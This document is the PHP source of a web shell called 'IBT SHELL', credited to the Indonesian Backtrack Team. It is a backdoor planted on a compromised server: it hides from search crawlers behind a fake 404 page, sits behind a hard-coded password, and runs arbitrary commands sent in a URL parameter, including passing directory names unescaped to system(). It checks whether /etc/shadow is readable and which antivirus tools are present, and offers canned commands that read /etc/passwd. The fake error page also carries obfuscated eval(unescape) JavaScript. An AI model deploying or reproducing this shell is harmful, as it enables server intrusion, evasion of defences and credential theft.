<?php
/*
SHELL INDONESIAN BACKTRACK TEAM
AUTHOR : CEEMDE aka PARIKESIT
KURAWA IBT
DATE : 30/11/2014
COPYRIGHT : MIT LICENSE
FOR EDUCATIONAL PURPOSE
*/

session_start();
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
?>

<html>
<head>
<title>IBT SHELL</title>
<style>
body {
margin:0;
color:#fff;
letter-spacing:0.5px;
/* Location of the image */
background-image: url(ibt.png);
/* Background image is centered vertically and horizontally at all times */
background-position: center center;
/* Background image doesn't tile */
background-repeat: no-repeat;
/* Background image is fixed in the viewport so that it doesn't move when 
the content's height is greater than the image's height */
background-attachment: fixed;
/* This is what makes the background image rescale based
on the container's size */
background-size: cover;
/* Set a background color that will be displayed
while the background image is loading */
background-color: #464646 ;
}
p{
font-size:14px;
line-height:24px;
}
table{
background:rgba(0,0,0,0.9);
}
a{
text-decoration:none;
color:red;
}
.overlay{
position:absolute;
#background:rgba(0,0,0,0.75);
width:100%;
height:100%;
left:0;
top:0;
right:0;
z-index:-1;
}
</style>
</head>
<body>

<?php
//Check User Agent
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "facebook","yahoo");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
	}	
}

//Check Login
if(isset($_POST['password'])){
	$pass = $_POST['password'];
	if($pass == "hasny"){
		$_SESSION['login'] = "Masuk";
	}
}

//Logout
if(isset($_GET['action']) & $_GET['action']=="logout"){
	session_start();
	session_destroy();
	$serv = htmlentities($_SERVER['PHP_SELF']);
	header('location:'.$serv);
}

//Cek HDD
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

//Cek Warna Permission
function viewPermsColor($f) { 
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}

//Cek Permission
function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}

//Cek Drive
	$drives = "";
	if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
		foreach( range('a','z') as $drive )
		if (is_dir($drive.':\\'))
			$drives .= '<a href="?file='.$drive.':" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}

//Function Ex
function ex($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}elseif(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
	
//Cek Security
function actionSecInfo() {

	echo '<h1>Server security information</h1><div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>'.$n.': </span>';
			if(strpos($v, "\n") === false)
				echo $v.'<br>';
			else
				echo '<pre class=ml1>'.$v.'</pre>';
		}
	}
	
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
	if(function_exists('apache_get_modules'))
       	showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	
	if( $GLOBALS['os'] == 'nix' ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
		showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
		showSecParam('OS version', @file_get_contents('/proc/version'));
		showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
			echo '<br>';
			$temp=array();
			foreach ($userful as $item)
				if(which($item)){$temp[]=$item;}
			showSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(which($item)){$temp[]=$item;}
			showSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item) 
				if(which($item)){$temp[]=$item;}
			showSecParam('Downloaders', implode(', ',$temp));
			echo '<br/>';
			showSecParam('Hosts', @file_get_contents('/etc/hosts'));
			showSecParam('HDD space', ex('df -h'));
			showSecParam('Mount options', @file_get_contents('/etc/fstab'));
		}
	} else {
		showSecParam('OS Version',ex('ver')); 
		showSecParam('Account Settings',ex('net accounts')); 
		showSecParam('User Accounts',ex('net user'));
	}
	echo '</div>';

}
//Disable Function
$disable_functions = @ini_get('disable_functions');

//Execute Function

if(!function_exists('execute')){
	function execute($code){
		$output = "";
		$code = $code." 2>&1";

		if(is_callable('system') && function_exists('system')){
			ob_start();
			@system($code);
			$output = ob_get_contents();
			ob_end_clean();
			if(!empty($output)) return $output;
		}
		elseif(is_callable('shell_exec') && function_exists('shell_exec')){
			$output = @shell_exec($code);
			if(!empty($output)) return $output;
		}
		elseif(is_callable('exec') && function_exists('exec')){
			@exec($code,$res);
			if(!empty($res)) foreach($res as $line) $output .= $line;
			if(!empty($output)) return $output;
		}
		elseif(is_callable('passthru') && function_exists('passthru')){
			ob_start();
			@passthru($code);
			$output = ob_get_contents();
			ob_end_clean();
			if(!empty($output)) return $output;
		}
		elseif(is_callable('proc_open') && function_exists('proc_open')){
			$desc = array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"));
			$proc = @proc_open($code, $desc, $pipes, getcwd(), array());
			if(is_resource($proc)){
				while($res = fgets($pipes[1])){
					if(!empty($res)) $output .= $res;
				}
				while($res = fgets($pipes[2])){
					if(!empty($res)) $output .= $res;
				}
			}
			@proc_close($proc);
			if(!empty($output)) return $output;
		}
		elseif(is_callable('popen') && function_exists('popen')){
			$res = @popen($code, 'r');
			if($res){
				while(!feof($res)){
					$output .= fread($res, 2096);
				}
				pclose($res);
			}
			if(!empty($output)) return $output;
		}
		return "";
	}
}

// ================================
// if user is logged in
if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
// welcome user
?>

<div class="overlay"></div>
		<?php
		if(isset($_GET['action']) & $_GET['action']=="phpinfo"){
		die(phpinfo());
		
		}
		?>
	<table width="100%" border="1" cellpadding="20px" cellspacing="0">
		<tr>
			<td>
					<p align="left"><?php 
								echo "Server Time : ".date("d-m-Y H:i:s")." (GMT + 7)<br />";
								echo "Software : ". $_SERVER['SERVER_SOFTWARE']."  ";
								echo "<a href='?action=phpinfo' target='_blank'>PHP Info</a> /"; 
								//Check Mysql
								if(function_exists('mysql_connect')){
								echo ' Mysql : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Mysql : <font color="red"> OFF</font> / ';
								}
								//Check Mssql
								if(function_exists('mssql_connect')){
								echo ' Mssql : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Mssql : <font color="yellow"> OFF</font> / ';
								}
								//Check Oracle
								if(function_exists('ocilogon')){
								echo ' Oracle : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Oracle : <font color="yellow"> OFF</font> / ';
								}
								//Check PostgreSQL
								if(function_exists('pg_connect')){
								echo ' PostgreSQL : <font color="green"> ON</font> / ';
								}
								else{
								echo ' PostgreSQL : <font color="yellow"> OFF</font> / ';
								}
								//Check Curl
								if(function_exists('curl_version')){
								echo ' Curl : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Curl : <font color="yellow"> OFF</font> / ';
								}
								//Check Sockets
								
								//Check Exec
								if(function_exists('exec')){
								echo ' Exec : <font color="green"> ON</font> / ';
								}
								else{
								echo ' Exec : <font color="yellow"> OFF</font> / ';
								}
								//Check Openbasedir
								if(!ini_get('open_basedir') != "on"){
								echo ' Open_basedir : <font color="yellow"> OFF</font> / ';
								}
								else{
								echo ' Open_basedir : <font color="green"> ON</font> / ';
								}
								//Check Ini Restore
								if(!ini_get('ini_restore') != "on"){
								echo ' Ini restore : <font color="yellow"> OFF</font> / ';
								}
								else{
								echo ' Ini restore : <font color="green"> ON</font> / ';
								}
								//Check Magic Quotes
								if(ini_get('magic_quotes_gpc') == '1'){
									echo ' Magic_quotes_gpc : <font color="red"> ON</font> / ';
								}
								else{
									echo ' Magic_quotes_gpc : <font color="yellow"> OFF </font> /';
								}
								//Check Wget
								$check = strtolower(execute("wget -h"));
								if(strpos($check,"usage")!==false) $wget = "on";
								if($wget == "on"){
									echo ' Wget : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Wget : <font color="yellow"> OFF</font> / ';
								}
								//Check Gcc
								$check = strtolower(execute("gcc --help"));
								if(strpos($check,"usage")!==false) $gcc = "on";
								if($gcc == "on"){
									echo ' Gcc : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Gcc : <font color="yellow"> OFF</font> / ';
								}
								//Check Perl
								$check = strtolower(execute("perl -h"));
								if(strpos($check,"usage")!==false) $perl = "on";
								if($perl == "on"){
									echo ' Perl : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Perl : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Python
								$check = strtolower(execute("python -h"));
								if(strpos($check,"usage")!==false) $python = "on";
								if($python == "on"){
									echo ' Python : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Python : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Ruby
								$check = strtolower(execute("ruby -h"));
								if(strpos($check,"usage")!==false) $ruby = "on";
								if($ruby == "on"){
									echo ' Ruby : <font color="green"> ON</font> / ';
								}
								else{
									echo ' Ruby : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Node
								$check = strtolower(execute("node -h"));
								if(strpos($check,"usage")!==false) $node = "on";
								if($node == "on"){
									echo ' node : <font color="green"> ON</font> / ';
								}
								else{
									echo ' node : <font color="yellow"> OFF</font> / ';
								}
								
								//Check NodeJs
								$check = strtolower(execute("nodejs -h"));
								if(strpos($check,"usage")!==false) $nodejs = "on";
								if($nodejs == "on"){
									echo ' nodejs : <font color="green"> ON</font> / ';
								}
								else{
									echo ' nodejs : <font color="yellow"> OFF</font> / ';
								}
								
								//Check Java
								$check = strtolower(execute("java -help"));
								if(strpos($check,"usage")!==false){
								$check = strtolower(execute("java -help"));
								if(strpos($check,"usage")!==false) {$java = "on";
								}}
								if($java == "on"){
									echo ' java : <font color="green"> ON</font> <br /> ';
								}
								else{
									echo ' java : <font color="yellow"> OFF</font> <br /> ';
								}																
								?>
								<?php

								echo "uname -a : ".php_uname()." (Check Exploit)<br />"; 	
								
								if(ini_get('safe_mode') == '1'){
									echo 'Safe mode:<font color="red"> ON </font> <a href="?turnoff=">(Turn OFF)</a> <br />';
								}
								else{
									echo 'Safe mode:<font color="green"> OFF </font><br />';
								} 
								if( isset( $_POST['c'] ) )
								@chdir($_POST['c']);
								$cwd = @getcwd();
								$GLOBALS['cwd'] = @getcwd();
								$freeSpace = @disk_free_space($GLOBALS['cwd']);
								$totalSpace = @disk_total_space($GLOBALS['cwd']);
								$home_cwd = @getcwd();

								$cwd_links = '';
								$path = explode("/", $GLOBALS['cwd']);
								$n=count($path);
								for($i=0;$i<$n-1;$i++) {
									$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
									for($j=0;$j<=$i;$j++){
										$cwd_links .= $path[$j].'/';
									$cwd_links .= "\")'>".$path[$i]."/</a>";
									}
								}
								
								?>
								
								<?php echo 'Directory : '.$cwd.' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a>' ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
								<br>Filesystem Mounted: <?php echo "<span>Free</span> ".viewSize($freeSpace)." of ".viewSize($totalSpace)."  (".(int)($freeSpace/$totalSpace*100)."%)"; ?> 
								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
								<br />Detected drives: <?=$drives?><br />
								Disabled Functions : <?php if($disable_functions ==""){
								echo "None ";}else{
								echo $disable_funstions;
								} ?> (Bypass)<br />
					</p>
			</td>
		</tr>		
		<?php
			//Exec Form
			if(isset($_GET['cmd'])){
		?>
		<tr>
		<td>
		<?php
		//Filter Command For Windows And For Unix
		$command = $_GET['cmd'];
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			if(preg_match("/ifconfig/", $command)||preg_match("/ls/", $command)||preg_match("/cat/", $command)||preg_match("/grep/", $command)||preg_match("/wget/", $command)||preg_match("/apt-get/", $command)||preg_match("/install/", $command)||preg_match("/mkdir/", $command)){
				echo '<font color="red"><b>This command not work on windows!</b></font><br />';
			}
		}
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'UNI') {
			if(preg_match("/ls/", $command)||preg_match("/tree/", $command)||preg_match("/cd../", $command)){
				echo '<font color="red"><b>This command not work on linux!</b></font><br />';
			}
		} 
		?>
		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;"><?=system($_GET['cmd'])?></textarea></td>
		</tr>
		<?php
		}
		?>
		<?php
		//Show Security Information
		if(isset($_GET['action']) & $_GET['action']=="secinfo"){
		echo "<tr><td>";
		echo actionSecInfo();
		echo "</td></tr>";
		}
		?>
		<tr>
			<td style="font-size:14px;">
			<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">File</a> | 
			<a href="?action=">Mysql</a> | 
			<a href="?action=">Symlink</a> | 
			<a href="?action=">Mass Deface</a> | 
			<a href="?action=">Hasher</a> | 
			<a href="?action=">Bind</a> | 
			<a href="?action=secinfo">Sec Info</a> |
			<a href="?action=">Terminal</a> | 
			<a href="?action=">Self-Destroy</a> | 
			<a href="?action=logout">Logout</a>			
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="background:transparent;" cellspacing="7px">
					<tr style="font-weight:bold;"><td>Nama</td><td>Size</td><td>Last Edit</td><td>Perm</td><td>Action</td></tr>
					<tr style="font-size:12px;"><td>.</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>..</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>tools/</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>index.php</td><td>100 KB</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>config.php</td><td>22 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="font-size:14px;background:transparent;" cellpadding="20px">
					<tr>
						<td>
							Upload : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/><br /><br /><input type="file" name="file" /> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							Change Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value="C:/xampp/htdocs/shell""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							<?php 
						if(isset($_GET['mkdir'])){
						system("mkdir ".$_GET['mkdir']);
						echo " Created ";
						}
						?>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Make Dir : <br /><input type="text" placeholder="C:\xampp\htdocs\shell\namafolder" name="mkdir" value=""/> <input type="submit" name="submit" value="Send"/>
						    </form>
						</td>
						<td>
							Read File : <br /><input type="text" placeholder="/path/file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							Make File : <br /><input type="text" placeholder="file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Execute : <br /><input type="text" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
					<tr>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Ready Command : <br />
												  <?php 
													if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
												  ?>
												  <select name="cmd">
												  <option value="whoami">Check Priv </option>
												  <option value="netstat -an">Cek Port Listen</option>
												  <option value="dir">List Directory</option>
												  <option value="start cmd.exe">Jalankan Cmd</option>
												  </select> 
												  <?php }else{ ?>
												  <select name="cmd">
												  <option value="whoami">Check Priv</option>
												  <option value="netstat -an">Cek Port Listen</option>
												  <option value="ls -la">List All hiden File</option>
												  <option value="ls">List Directory</option>
												  <option value="uname -a">Information Kernel</option>
												  <option value="cat /etc/passwd">Read /etc/passwd</option>
												  <option value="cat /etc/hosts">Read /etc/hosts</option>
												  </select> 												  
												  <?php } ?>
												 
							<input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<p style="text-align:center;font-weight:bolder;">Copyright Indonesian Backtrack Team</p>
			</td>
		</tr>
	</table>

	
<?php
}else{
?>
<body style="margin:10px;background:#fff;color:#000;overflow:hidden;">
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%61%61%61%61%34%34%34%61%64%33%34%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%38%35%30%31%34%32%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%38%36%33%37%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%61%61%61%61%34%34%34%61%64%33%34%28%27') + '%36%6f%6b%75%62%5c%37%03%09%06%03%67%65%62%69%6b%12%73%67%64%6d%68%6d%63%61%65%34%6c%5c%66%59%6b%62%6a%54%34%68%61%67%34%21%28%2f%26%67%6d%35%61%66%5d%58%6b%34%21%2c%35%26%67%6d%35%52%6a%6a%6d%66%6c%34%5b%59%5c%58%6e%64%63%34%67%5f%69%5b%65%65%34%26%32%5b%5f%52%64%5d%6e%66%69%60%5b%21%5b%66%61%61%61%37%19%5a%5d%58%37%59%63%68%5b%5e%6e%39%2e%64%68%17%6f%63%63%65%5a%17%18%5a%55%5b%31%10%74%01%04%00%36%27%6a%69%77%6b%5a%36%03%01%05%36%5a%59%64%6b%5e%6e%3d%02%02%07%33%58%63%69%61%16%64%5e%6c%57%60%58%33%19%62%63%6a%6e%18%17%5a%5d%63%66%65%62%34%1c%36%36%62%5e%67%15%1c%5e%4c%3f%4e%4d%39%4c%52%1b%46%3f%45%51%42%3a%40%3a%1e%51%37%36%30%18%17%37%03%09%06%30%67%65%62%69%6b%12%6a%70%65%5b%3c%1f%64%5f%6a%6f%6b%66%6c%5a%19%15%62%50%62%5f%33%19%62%5d%6a%6f%6f%66%6b%5c%11%11%69%6c%70%66%59%34%1c%58%58%58%65%56%6f%65%6b%65%5e%34%6b%6c%59%65%68%60%50%6f%5f%62%6b%37%63%6c%6e%62%60%67%5b%39%63%65%62%5c%37%5c%66%6c%5a%5c%6b%36%6d%60%66%5b%32%5f%63%63%63%68%31%18%5a%55%5b%31%1e%35%01%04%00%36%27%5d%64%6e%6c%33%30%21%5a%59%60%6b%59%68%3518501423%35%35%30%35%31%30%32' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>
<?php
}
?>
</body>
</html>